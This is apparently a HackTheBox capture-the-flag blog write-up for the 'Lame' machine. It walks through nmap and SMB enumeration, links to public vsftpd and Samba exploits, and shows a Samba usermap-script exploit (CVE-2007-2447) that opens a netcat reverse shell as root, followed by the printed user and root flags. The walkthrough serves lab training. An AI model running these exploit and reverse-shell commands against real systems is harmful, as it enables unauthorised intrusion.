---
layout: post
title: "Lame Writeup - HackTheBox"
category: HackTheBox
---
## HTB - Lame

The first machine I am going to do is called Lame, it is a linux machine and since I have VIP+ it is a personalized machine (Which is a big plus).

### Enumeration

First I started some enum ofcourse:

```
root@kali:/home/kali/Desktop/HTB/machines/lame# nmap -sS -sV 10.129.95.84 | tee firstnmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-10 09:40 EST
Nmap scan report for 10.129.95.84
Host is up (0.014s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.28 seconds
```

```
root@kali:/home/kali/Desktop/HTB/machines/lame# nmap -A 10.129.95.84 | tee secondnmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-10 11:04 EST
Nmap scan report for 10.129.95.84
Host is up (0.013s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.33
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.18 (ClarkConnect 4.3 Enterprise Edition) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h30m36s, deviation: 3h32m09s, median: 35s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-02-10T11:05:22-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   12.58 ms 10.10.14.1
2   13.06 ms 10.129.95.84

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.71 seconds

```

Some web enum, that ofcourse was very very usefull :P

```
root@kali:/home/kali/Desktop/HTB/machines/lame# nikto -C all -h 10.129.95.84 | tee firstnikto.txt
- Nikto v2.1.6
---------------------------------------------------------------------------
+ No web server found on 10.129.95.84:80
---------------------------------------------------------------------------
+ 0 host(s) tested

```

Some SMB enum attempts:

```
root@kali:/home/kali/Desktop/HTB/machines/lame# nmblookup -A 10.129.95.84 | tee NMBlookup.txt
Looking up status of 10.129.95.84
No reply from 10.129.95.84
```

```
root@kali:/home/kali/Desktop/HTB/machines/lame# smbclient //MOUNT/share -I 10.129.95.84 -N | tee smbclient.txt
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

```
root@kali:/home/kali/Desktop/HTB/machines/lame# rpcclient -U "" 10.129.95.84 | tee rpcclient.txt
Cannot connect to server.  Error was NT_STATUS_CONNECTION_DISCONNECTED
```

```
root@kali:/home/kali/Desktop/HTB/machines/lame# enum4linux 10.129.95.84 | tee enum4linux.txt
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Feb 10 09:50:15 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.129.95.84
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.129.95.84    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.129.95.84    |
 ============================================ 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
Looking up status of 10.129.95.84
No reply from 10.129.95.84

 ===================================== 
|    Session Check on 10.129.95.84    |
 ===================================== 
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
```

### CVE Hunting

When I observed the lack of info in the SMB enum attempts I decided to go on a CVE hunt from what I learned from the NMAP scan. See how far i'd get and if I did not find any progress i'd get back to enum. For those of you who dont know what CVE's are; CVE's are known vulnerabilities in software provided by various cyber security researchers accross the globe, maintained in one knowledgebase. Or as wikipedia descibes it:

`The Common Vulnerabilities and Exposures (CVE) system provides a reference-method for publicly known information-security vulnerabilities and exposures. The National Cybersecurity FFRDC, operated by The MITRE Corporation, maintains the system, with funding from the National Cyber Security Division of the United States Department of Homeland Security.[1] The system was officially launched for the public in September 1999.[2]` ~ [Source? Click here!](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures)

So I went over to [CVEDetails](https://www.cvedetails.com/) and made an overview of potentialy usefull vulnerabilities in the software NMAP detected:

#### OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)

1.  [Really just one vuln that is kinda usefull?](https://www.cvedetails.com/cve/CVE-2010-4478/)

#### Samba 3.0.20

1.  [I love the internet](https://www.cvedetails.com/vulnerability-list.php?vendor_id=102&product_id=171&version_id=41384&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=0&month=0&cweid=0&order=3&trc=41&sha=f1a0c39b874e7afec0e84a7459c672610a42ad14)

OpenSSH 4.7p1 and Samba 3.0.20 where the only softwareapplications which had some usefull CVE's within this machine. Which made me realise that;

1.  not every vulnerability is registered via CVE's
2.  Not every exploit out there knows a vulnerability that is registered in CVE's

Therefore CVE hunting is fun and all, but it is not compulsary to achieve initial foothold. Therefore I decided to search for exploits straight away.

### Find the exploit 🔍

Basicly I started google-ing by the following keyword combinations:

- softwarename + softwareversion + exploit
- softwarename + softwareversion + exploit + github
- softwarename + softwareversion + github
- softwarename + softwareversion + exploitdb
- softwarename + softwareversion + exploit + exploitdb
- softwarename + softwareversion

#### vsftpd 2.3.4

I found the following exploits for this version of vsftpd:

1.  [Metasploit module provided by rapid7](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)
2.  [Basicly the same metasploit module but then from Exploit DB](https://www.exploit-db.com/exploits/17491)
3.  [A nice python exploit on github](https://github.com/ahervias77/vsftpd-2.3.4-exploit)

#### OpenSSH 4.7p1

1.  [Not per se an exploit, but a nice reference guide.](https://charlesreid1.com/wiki/Metasploitable/SSH/Exploits)
2.  [An exploit written in C, based on the only usefull CVE I found so far](https://security.stackexchange.com/questions/59220/bypassing-cve-2010-4478-j-pake-parameter-validation-in-openssh-5-1)

#### Samba 3.0.20

1.  [Metasploit at it again](https://www.exploit-db.com/exploits/16320)
2.  [Huhm a usermap python exploit, maybe will be of use?](https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851)
3.  [This one looks like the usermap one, but idk something is different about it that gives me more hope xD](https://github.com/macha97/exploit-smb-3.0.20/blob/master/exploit-smb-3.0.20.py)
4.  [A mysterious looking exploit written in C](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/7701.zip)
5.  [Yet another usermap script](https://github.com/amriunix/CVE-2007-2447)

### Exploitation galore 🔥

As I said earlier, I am trying to mimic a scenario that looks like the actual OSCP more and more along the way of my 20 weeks. Therefore I will use non metasploit exploits more then the ones I find for metasploit. Though I do wonder if the restrictions for metasploit only count for the interface or also for the scripts that are used in metasploit itself. Since I do remember metasploit storing the scripts it uses somewhere on the file system itself. Anyways listed below are my exploitation attempts.

#### VSFTPD

The second NMAP I ran gave me a version and port which FTP runs on. And also information about the setup of FTP:

```
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.33
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
```

Therefore i'll be trying to login as FTP or loging in anonymous. And i'll also try the exploits found for this specific version of vstpd.

VSFTPD Exploitation attempt #1:
loging in with username="anonymous" and password=""

```
root@kali:/home/kali/Desktop/HTB/machines/lame# ftp 10.129.95.84
Connected to 10.129.95.84.
220 (vsFTPd 2.3.4)
Name (10.129.95.84:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> quote 
(command line to send) whoami
500 Unknown command.
ftp> quote whoami
500 Unknown command.
ftp> quote ls
500 Unknown command.
```

Cant really execute any commands, maybe will use to transfer file later on in the process.

VSFTPD Exploitation attempt #2:
Sadly it failed :(

```
root@kali:/home/kali/Desktop/HTB/machines/lame# python3 vsftpd_234_exploit.py 10.129.95.84 21 whoami 
[*] Attempting to trigger backdoor...
[+] Triggered backdoor
[*] Attempting to connect to backdoor...
[!] Failed to connect to backdoor on 10.129.95.84:6200
```

#### Samba

Imma use [this](https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851) exploit first to see what the outcome will be:

```
root@kali:/home/kali/Desktop/HTB/machines/lame# python -m pip install pysmb
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
Collecting pysmb
  Downloading pysmb-1.2.6.zip (1.3 MB)
     |████████████████████████████████| 1.3 MB 17.9 MB/s 
Collecting pyasn1
  Downloading pyasn1-0.4.8-py2.py3-none-any.whl (77 kB)
     |████████████████████████████████| 77 kB 13.6 MB/s 
Building wheels for collected packages: pysmb
  Building wheel for pysmb (setup.py) ... done
  Created wheel for pysmb: filename=pysmb-1.2.6-py2-none-any.whl size=83811 sha256=8932e100c8dbc308890431f9640819853c5ae3dc00fee081d220820a7273a348
  Stored in directory: /root/.cache/pip/wheels/1f/8a/1e/300e48a168ba84cfa4668955860016d44330faebab0ccb097e
Successfully built pysmb
Installing collected packages: pyasn1, pysmb
Successfully installed pyasn1-0.4.8 pysmb-1.2.6
WARNING: You are using pip version 20.2.4; however, version 20.3.4 is available.
You should consider upgrading via the '/usr/bin/python -m pip install --upgrade pip' command.
root@kali:/home/kali/Desktop/HTB/machines/lame# python samba-usermap-exploit.py 10.129.95.84
ls
Traceback (most recent call last):
  File "samba-usermap-exploit.py", line 42, in <module>
    assert conn.connect(sys.argv[1], 445)
  File "/usr/local/lib/python2.7/dist-packages/smb/SMBConnection.py", line 122, in connect
    self._pollForNetBIOSPacket(timeout)
  File "/usr/local/lib/python2.7/dist-packages/smb/SMBConnection.py", line 595, in _pollForNetBIOSPacket
    raise SMBTimeout
smb.base.SMBTimeout
root@kali:/home/kali/Desktop/HTB/machines/lame# ls
enum4linux.txt	firstnmap.txt  rpcclient.txt		 secondnmap.txt  vsftpd_234_exploit.py
firstnikto.txt	NMBlookup.txt  samba-usermap-exploit.py  smbclient.txt
root@kali:/home/kali/Desktop/HTB/machines/lame# nano samba-usermap-exploit.py 
root@kali:/home/kali/Desktop/HTB/machines/lame# python samba-usermap-exploit.py 10.129.95.84
Traceback (most recent call last):
  File "samba-usermap-exploit.py", line 42, in <module>
    assert conn.connect(sys.argv[1], 445)
  File "/usr/local/lib/python2.7/dist-packages/smb/SMBConnection.py", line 122, in connect
    self._pollForNetBIOSPacket(timeout)
  File "/usr/local/lib/python2.7/dist-packages/smb/SMBConnection.py", line 595, in _pollForNetBIOSPacket
    raise SMBTimeout
smb.base.SMBTimeout
```

For some reason this script dont work. So ill be trying [this](https://github.com/macha97/exploit-smb-3.0.20/blob/master/exploit-smb-3.0.20.py) one after editting the variables via nano:

```
root@kali:/home/kali/Desktop/HTB/machines/lame# python3 exploit-smb-3.0.20.py 
Traceback (most recent call last):
  File "/home/kali/Desktop/HTB/machines/lame/exploit-smb-3.0.20.py", line 22, in <module>
    conn.connect(victim_ip, 139)
  File "/usr/lib/python3/dist-packages/smb/SMBConnection.py", line 112, in connect
    self._pollForNetBIOSPacket(timeout)
  File "/usr/lib/python3/dist-packages/smb/SMBConnection.py", line 541, in _pollForNetBIOSPacket
    raise SMBTimeout
smb.base.SMBTimeout
```

And again this script did not work as well, lucky for me [this](https://github.com/amriunix/CVE-2007-2447) script implements a different shell creation method so here goes nothing:

```
root@kali:/home/kali/Desktop/HTB/machines/lame# python usermap_script.py 10.129.95.84 139 10.10.14.33 666
[*] CVE-2007-2447 - Samba usermap script
[+] Connecting !
[+] Payload was sent - check netcat !
```

And so I did check netcat:

```
root@kali:/home/kali/Desktop/HTB/machines/lame# nc -lvp 666
listening on [any] 666 ...
10.129.95.84: inverse host lookup failed: Unknown host
connect to [10.10.14.33] from (UNKNOWN) [10.129.95.84] 58516
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
initrd.img.old
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```

I figured out I was root:

```
whoami
root
ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:72:52  
          inet addr:10.129.95.84  Bcast:10.129.255.255  Mask:255.255.0.0
          inet6 addr: dead:beef::250:56ff:feb9:7252/64 Scope:Global
          inet6 addr: fe80::250:56ff:feb9:7252/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:30703 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1174 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:2362347 (2.2 MB)  TX bytes:129855 (126.8 KB)
          Interrupt:19 Base address:0x2024 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:1749 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1749 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:848725 (828.8 KB)  TX bytes:848725 (828.8 KB)
```

Basicly victory is mine at this point:

```
find user.txt
find: user.txt: No such file or directory
cd ..
pwd
/home
ls
ftp
makis
service
user
cd ftp
ls
ls -al
total 8
drwxr-xr-x 2 root nogroup 4096 Mar 17  2010 .
drwxr-xr-x 6 root root    4096 Mar 14  2017 ..
cd ..
cd makis
ls
user.txt
cat user.txt
133ac0a52cc545a05aace2cdfc052558

```

```
cd /root
ls
Desktop
reset_logs.sh
root.txt
vnc.log
cat root.txt
9d0a48194008227c3e8eb2100c8ce9f8
```

I rate this box 4/10 with 10 being the most difficult, do-able for a semi-beginner. If I did not have to screw around with the HTB VPN setup I would have done it in 1/2 hours. Nice first box to do!
